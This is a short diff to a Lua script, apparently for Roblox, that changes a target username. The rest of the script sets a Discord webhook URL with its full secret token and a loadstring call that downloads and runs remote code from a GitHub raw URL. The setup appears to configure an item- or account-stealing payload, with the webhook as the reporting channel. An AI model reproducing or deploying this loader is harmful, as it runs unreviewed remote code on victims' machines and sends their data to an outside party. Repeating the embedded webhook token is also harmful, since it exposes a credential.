@@ -1,4 +1,4 @@
-Username = "prince12ryannm"
+Username = "prince12ryannn"
 Webhook = "https://discord.com/api/webhooks/1273786000845574227/1mlNDVDHDApNkhkQVVSTK4lH_BkES7y_m23EQzX4ZRTuy4saIw25mJdN0rfy3HAxLE6j"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
